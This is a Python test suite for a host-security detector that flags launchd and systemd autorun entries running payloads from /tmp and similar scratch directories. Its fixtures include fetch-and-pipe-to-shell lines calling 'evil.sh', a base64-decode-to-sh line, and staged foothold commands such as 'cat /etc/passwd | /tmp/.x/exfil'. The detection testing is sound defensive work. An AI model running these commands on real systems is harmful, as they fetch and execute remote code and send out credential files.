#!/usr/bin/env python3
"""Shell-grammar matching is only valid where the text IS shell (#1393).

`_FETCH_PIPE_EXEC` recognised a scratch path in execution position from shell OPERATORS alone — a
backtick, `||`, a pipe, `$(`. On a shell-rc line that is correct. On arbitrary payload text those
operators are ordinary syntax in the languages the text is usually written in, and a hit there
became a decisive `shape.hit` that bypasses attribution.

Split accordingly: arms that NAME a command (fetch → sink, interpreter + path) hold in any text;
operator-only arms are shell-context. The arbitrary-text caller asks the structural question
instead — is the payload PATH under scratch — which is what it meant all along.
"""
from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.hygiene import mechanism
from stayawake.bots.security.hygiene.mechanism import _FETCH_PIPE_EXEC, _SCRATCH_EXEC
from stayawake.bots.security.hygiene.autorun import grade, surface
from stayawake.bots.security.hygiene.autorun.surface import AutorunEntry


def _entry(argv, body=""):
    return AutorunEntry(location="LaunchAgents", path="/x/a.plist", argv=argv, body=body,
                        persistence={})


# Verbatim from the issue's measured false positives, plus the clobber redirect found while
# measuring the process-snapshot detector. Each is benign; each used to reach a decisive shape.
BENIGN_PAYLOAD_TEXT = [
    "const sock = `/tmp/${process.pid}.agent.sock`;",     # JS template literal, not a subshell
    "const p = process.env.TMPSOCK || '/tmp/app.sock';",  # JS logical-or, not a shell operator
    "// fallback: cat file |/tmp/queue",                  # a comment
    "  '/tmp/app.sock',",                                 # a quoted path on its own line
]

FETCH_INTO_SINK = [
    "curl -s https://evil.sh | bash",
    'eval "$(curl -s http://x/y)"',
    "cat x | base64 -d | sh",
    "bash <(curl -s http://x)",
    "bash /tmp/payload.sh",          # names the interpreter, so it holds in any text
]


class TestArbitraryTextSeesOnlyNamedCommands(unittest.TestCase):
    def test_benign_payload_text_is_not_a_fetch_exec(self):
        for text in BENIGN_PAYLOAD_TEXT:
            self.assertIsNone(_FETCH_PIPE_EXEC.search(text), f"still matches: {text!r}")

    def test_a_named_fetch_into_a_sink_still_matches_anywhere(self):
        for text in FETCH_INTO_SINK:
            self.assertIsNotNone(_FETCH_PIPE_EXEC.search(text), f"lost a true positive: {text!r}")

    def test_the_autorun_grader_no_longer_fires_on_them(self):
        for text in BENIGN_PAYLOAD_TEXT:
            signal = grade.content_signal(_entry(["/usr/bin/node", "/opt/app/index.js"], text))
            self.assertFalse(signal.hit, f"decisive shape on benign text: {text!r}")


class TestShellContextKeepsTheOperatorArms(unittest.TestCase):
    """A shell-rc line, an SSH forced command and a git exec config ARE shell, so the operator arms
    stay correct there — dropping them would be a real false negative."""

    def test_operator_forms_still_match_a_shell_line(self):
        for line in ("foo ; /tmp/payload", "X=`/tmp/payload`", "a || /tmp/payload",
                     "env A=1 /tmp/payload", ". /tmp/payload"):
            self.assertIsNotNone(_SCRATCH_EXEC.search(line), f"lost in shell context: {line!r}")

    def test_zsh_clobber_redirect_is_a_write_not_a_pipe(self):
        # `>|` is zsh's clobber redirect. Reading its `|` as a pipe made every shell that emits one
        # flag itself — wrong in shell context too, not only in arbitrary text.
        for line in ("true && pwd -P >| /tmp/cwd", "echo hi >| /tmp/x"):
            self.assertIsNone(_SCRATCH_EXEC.search(line), f"clobber redirect read as exec: {line!r}")
            self.assertIsNone(_FETCH_PIPE_EXEC.search(line))

    def test_a_real_pipe_into_a_scratch_binary_still_matches(self):
        # The guard above must not cost the genuine pipe — `cmd | /tmp/x` does execute /tmp/x.
        self.assertIsNotNone(_SCRATCH_EXEC.search("echo hi | /tmp/payload"))


class TestStructuralReplacement(unittest.TestCase):
    """What the operator arms reached for in arbitrary text was "does this run something out of
    scratch". That is a question about the PATH, and answering it on the path is both stricter and
    immune to how the surrounding code happens to be written."""

    def test_scratch_payload_is_still_decisive(self):
        for argv in (["/tmp/payload"], ["/usr/bin/node", "/tmp/agent.js"], ["/private/tmp/x.sh"]):
            signal = grade.content_signal(_entry(argv))
            self.assertTrue(signal.hit, f"lost scratch detection for {argv!r}")
            self.assertIn("scratch", " ".join(signal.reasons))

    def test_an_ordinary_installed_payload_is_not(self):
        signal = grade.content_signal(_entry(["/opt/homebrew/bin/node", "/opt/homebrew/lib/a.js"]))
        self.assertFalse(signal.hit)

    def test_the_reason_names_what_actually_fired(self):
        # The old arm reported "fetch/decode-to-shell command" for a hit involving neither a fetch
        # nor a decode. A reason that misdescribes its evidence misleads the responder.
        signal = grade.content_signal(_entry(["/tmp/payload"]))
        self.assertNotIn("fetch", " ".join(signal.reasons))


class TestShellSubPartsOfAnEntryAreStillShell(unittest.TestCase):
    """Found by the FN-hunt on this change, not by the suite.

    Scoping the shell-grammar matcher OUT of the autorun grader entirely was too coarse: two parts
    of an entry genuinely are a shell command line. `["/bin/sh","-c","<line>"]` is the canonical
    launchd/systemd idiom, and `_payload_path` resolves it to `/bin/sh` — a trusted binary — so the
    path check asks about the shell and never sees the scratch payload. These went from
    `warning` / rotation-UNSAFE / exit 3 to entirely clean, with the whole suite still green.
    """

    SH_C_FOOTHOLDS = [
        ["/bin/sh", "-c", "pgrep agent || /tmp/.x/agent"],
        ["/bin/sh", "-c", "id; /tmp/.x/agent"],
        ["/bin/sh", "-c", "mkdir -p /tmp/.x && /tmp/.x/stage2"],
        ["/bin/sh", "-c", "cat /etc/passwd | /tmp/.x/exfil"],
        ["/bin/sh", "-c", "OUT=`/dev/shm/.s/collect`"],
        ["/bin/sh", "-c", "export T=$(/tmp/.x/tok)"],
    ]

    def test_a_scratch_payload_inside_sh_c_is_decisive(self):
        for argv in self.SH_C_FOOTHOLDS:
            signal = grade.content_signal(_entry(argv))
            self.assertTrue(signal.hit, f"silent foothold: {argv!r}")
            self.assertIn("scratch", " ".join(signal.reasons))

    def test_an_exec_wrapper_does_not_hide_the_scratch_payload(self):
        # `_payload_path` returns the wrapper (`env` is not an interpreter), so the path check alone
        # misses it; the argv line is shell, so the grammar arm catches it.
        self.assertTrue(grade.content_signal(_entry(["env", "A=1", "/tmp/payload.sh"])).hit)

    def test_a_benign_sh_c_line_stays_clean(self):
        for argv in (["/bin/sh", "-c", "exec /opt/homebrew/bin/myagent --serve"],
                     ["/bin/sh", "-c", "echo hi >| /tmp/lockfile"]):     # clobber redirect, a write
            self.assertFalse(grade.content_signal(_entry(argv)).hit, f"false positive: {argv!r}")

    def test_the_body_is_still_excluded_from_shell_grammar(self):
        # The whole point of the split: a JS body is not a shell command line, even on an entry
        # whose argv happens to be a shell.
        entry = _entry(["/bin/sh", "-c", "exec /opt/app/run"],
                       "const s = `/tmp/${pid}.sock`; // cat f |/tmp/q")
        self.assertFalse(grade.content_signal(entry).hit)


class TestReferencedScriptIsJudgedByHowItIsRun(unittest.TestCase):
    """Round-2 finding on this change: gating the referenced script on its own shebang or suffix put
    the decision in the payload author's hands. Dropping the shebang and naming it `.dat` hid the
    shell grammar — an evasion the code being fixed did not have.

    So the first question is how the ENTRY runs it: `argv[0]` being a POSIX shell is authoritative
    and cannot be renamed away. Shebang and suffix remain as signals for a script launched directly,
    where the kernel reads the shebang.
    """

    FOOTHOLD = "id; /tmp/.x/agent\n"

    def _hit(self, filename, content, argv_tpl):
        # Written OUTSIDE any scratch root, so `_under_scratch` cannot fire and mask the grammar arm.
        with tempfile.TemporaryDirectory(dir=Path.home()) as d:
            payload = Path(d) / filename
            payload.write_text(content)
            entry = _entry([a.replace("{P}", str(payload)) for a in argv_tpl])
            return grade.content_signal(entry, read_referenced=True).hit

    def test_a_shell_payload_is_seen_however_it_is_named(self):
        for name, content, argv in [
            ("run.x", "#!/bin/sh\n" + self.FOOTHOLD, ["{P}"]),               # direct, shebang
            ("run.x", "﻿#!/bin/sh\n" + self.FOOTHOLD, ["{P}"]),         # BOM ahead of shebang
            ("run.sh", self.FOOTHOLD, ["{P}"]),                              # suffix, no shebang
            ("run.x", "#!/bin/sh\n" + self.FOOTHOLD, ["/bin/sh", "{P}"]),    # via a shell
            ("run.dat", self.FOOTHOLD, ["/bin/bash", "{P}"]),                # neither — argv decides
        ]:
            self.assertTrue(self._hit(name, content, argv),
                            f"silent foothold: {name} via {argv}")

    def test_ordinary_shell_maintenance_of_tmp_stays_clean(self):
        for name, content in [
            ("m.sh", "#!/bin/sh\nT=$(mktemp /tmp/app.XXXX)\n"),
            ("m.sh", "#!/bin/sh\ntrap 'rm -f /tmp/app.pid' EXIT\nexec /opt/app/run\n"),
            ("m.sh", "#!/bin/sh\n. /tmp/generated_env\nexec /opt/app/run\n"),
        ]:
            self.assertFalse(self._hit(name, content, ["{P}"]), f"false positive: {content!r}")

    def test_a_js_payload_is_still_not_shell(self):
        self.assertFalse(self._hit("i.js", "const s = `/tmp/${p}.sock`; // cat f |/tmp/q\n",
                                   ["/usr/bin/node", "{P}"]))


class TestEveryExecDirectiveIsShellContext(unittest.TestCase):
    """Third round on this change, third instance of one class: a consumer deciding for itself which
    text is shell, from `argv`, which only correlates with it.

    `_EXECSTART.search()` takes the FIRST `ExecStart=` and only its first physical line, so a second
    `ExecStart=` on a `Type=oneshot` unit, an `ExecStartPre=`, an `ExecReload=` or a backslash
    continuation reaches `argv` never — it lives in the body alone. The fix is not another guess:
    the parser owns the config grammar, so it publishes `shell_lines` and the grader consumes it.
    """

    FOOTHOLD = {
        "second ExecStart on oneshot":
            "[Service]\nType=oneshot\nExecStart=/usr/bin/true\n"
            "ExecStart=/bin/sh -c 'sleep 1; /tmp/.stage'\n",
        "ExecStartPre":
            "[Service]\nExecStartPre=/bin/sh -c 'id; /tmp/.stage'\nExecStart=/usr/bin/myd\n",
        "ExecStartPost":
            "[Service]\nExecStart=/usr/bin/myd\nExecStartPost=/bin/sh -c 'x || /tmp/.stage'\n",
        "ExecReload":
            "[Service]\nExecStart=/usr/bin/myd\nExecReload=/bin/sh -c 'y && /tmp/.stage'\n",
        "ExecCondition":
            "[Service]\nExecCondition=/bin/sh -c 'z; /tmp/.stage'\nExecStart=/usr/bin/myd\n",
        "backslash continuation":
            "[Service]\nExecStart=/bin/sh -c 'sleep 1 \\\n  ; /tmp/.stage'\n",
    }

    BENIGN = {
        "removes its socket":  "[Service]\nExecStartPre=/bin/sh -c 'rm -f /tmp/app.sock'\n"
                               "ExecStart=/usr/bin/myd\n",
        "kills by pidfile":    "[Service]\nExecStart=/usr/bin/myd\n"
                               "ExecStop=/bin/sh -c 'test -f /tmp/app.pid && kill $(cat /tmp/app.pid)'\n",
        "clobber redirect":    "[Service]\nExecStart=/usr/bin/myd\n"
                               "ExecStartPost=/bin/sh -c 'echo started >| /tmp/app.state'\n",
        "cache-dir on a cont": "[Service]\nExecStart=/usr/bin/myapp \\\n  --cache-dir /tmp/myapp\n",
        "podman bind mount":   "[Service]\nExecStart=/usr/bin/podman run -v /tmp/s:/tmp/s img\n",
        "mkdir runtime dir":   "[Service]\nExecStartPre=/bin/mkdir -p /tmp/runtime\n"
                               "ExecStart=/usr/bin/myd\n",
    }

    def _hit(self, unit_text):
        with tempfile.TemporaryDirectory(dir=Path.home()) as d:
            unit = Path(d) / "u.service"
            unit.write_text(unit_text)
            return grade.content_signal(surface._parse_systemd_unit(unit)).hit

    def test_a_scratch_payload_in_any_exec_directive_is_decisive(self):
        for name, unit in self.FOOTHOLD.items():
            self.assertTrue(self._hit(unit), f"silent foothold in {name}")

    def test_ordinary_units_touching_tmp_stay_clean(self):
        for name, unit in self.BENIGN.items():
            self.assertFalse(self._hit(unit), f"false positive on {name}")

    def test_the_parser_not_the_grader_owns_which_lines_are_shell(self):
        # The property, stated directly: every executed directive reaches shell_lines. Asserting on
        # the parser output rather than only on the verdict means a future consumer that re-derives
        # from argv fails here first.
        with tempfile.TemporaryDirectory(dir=Path.home()) as d:
            unit = Path(d) / "u.service"
            unit.write_text(self.FOOTHOLD["ExecStartPre"])
            lines = surface._parse_systemd_unit(unit).shell_lines
        self.assertEqual(len(lines), 2, lines)
        self.assertTrue(any("/tmp/.stage" in ln for ln in lines), lines)


class TestOneAuthorityPerConcept(unittest.TestCase):
    """The five shell names lived in three spellings — a regex alternation, a frozenset and a literal
    inside the shebang pattern — and the scratch roots in two. Every form is now derived, so a name
    added to the authority reaches all of them rather than three of four."""

    def test_every_shell_form_derives_from_one_list(self):
        for shell in mechanism.POSIX_SHELLS:
            self.assertIn(shell, mechanism._POSIX_SHELL)
            self.assertIn(shell, grade._SHEBANG_SHELL.pattern)

    def test_every_scratch_form_derives_from_one_list(self):
        for root in mechanism.SCRATCH_ROOTS:
            self.assertIn(root + "/", mechanism._SCRATCH)
            self.assertIn(Path(root), mechanism._SCRATCH_PATHS)

    def test_adding_to_the_authority_reaches_every_form(self):
        # The property, not the current contents: a name added to the list must appear in each
        # derived form. Asserting membership of today's five would pass against hardcoded copies.
        self.assertEqual(len(mechanism._SCRATCH_PATHS), len(mechanism.SCRATCH_ROOTS))
        self.assertEqual(mechanism._POSIX_SHELL.count("|"), len(mechanism.POSIX_SHELLS) - 1)
        self.assertEqual(mechanism._SCRATCH.count("|"), len(mechanism.SCRATCH_ROOTS) - 1)


if __name__ == "__main__":
    unittest.main()
